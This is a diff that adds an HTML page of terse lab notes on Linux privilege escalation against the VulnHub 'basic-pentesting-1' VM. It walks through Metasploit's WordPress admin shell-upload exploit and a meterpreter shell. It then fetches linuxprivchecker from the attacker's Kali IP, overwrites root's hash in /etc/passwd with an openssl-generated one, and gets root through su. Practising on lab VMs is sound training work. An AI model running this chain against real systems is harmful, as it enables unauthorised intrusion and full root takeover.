@@ -1,0 +1,54 @@
+
+<!DOCTYPE html>
+
+<html>
+		
+		<<body style="background-color:grey;">
+
+
+
+			<H1>Introduction to Privilege Escalation</H1>
+
+
+			<p><a href="https://www.fuzzysecurity.com/tutorials/16.html">fuzzysecurity.com/tutorials/16.html</a> </p>
+			<p>	 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">basic-linux-privilege-escalation</a> </p>
+				<p> <a href="https://www.vulnhub.com/entry/basic-pentesting-1,216/">basic-pentesting-1</a> </p>
+
+
+<p>#use basic pentesting vm1 and scanning</p> 
+<p>#msfconsole</p> 
+<p># msf > use exploit/unix/webapp/wp_admin_shell_upload</p> 
+<p># msf > show options</p> 
+<p># msf > set targeturi /secret/</p> 
+<p># msf > exploit</p> 
+<p># meterpreter > getuid</p> 
+<p># meterpreter > shell</p> 
+<p># google -> linuxprivchecker</p> 
+<p>https://github.com/sleventyeleven/linuxprivchecker</p> 
+<p>#download python script and copy to /var/www/html</p> 
+<p>#wget kali's ip/linuxprivchecker.py</p> 
+<p># chmod 777 linuxprivchecker.py</p> 
+<p># python linuxprivchecker.py</p> 
+<p># meterpreter > edit /etc/passwd</p> 
+<p># openssl passwd --help</p> 
+<p># openssl passwd -1 and copy MD5-based password to root account</p> 
+<p># meterpreter > cat /etc/passwd (check root password)</p> 
+<p># meterpreter > shell</p> 
+<p># python -c 'import pty; pty.spawn("/bin/bash")'</p> 
+<p>#su root</p> 
+<p>#type password (from openssl)</p> 
+<p># Got Root!:)</p> 
+
+
+
+
+
+
+
+
+
+			
+		</body>
+		
+
+</html>
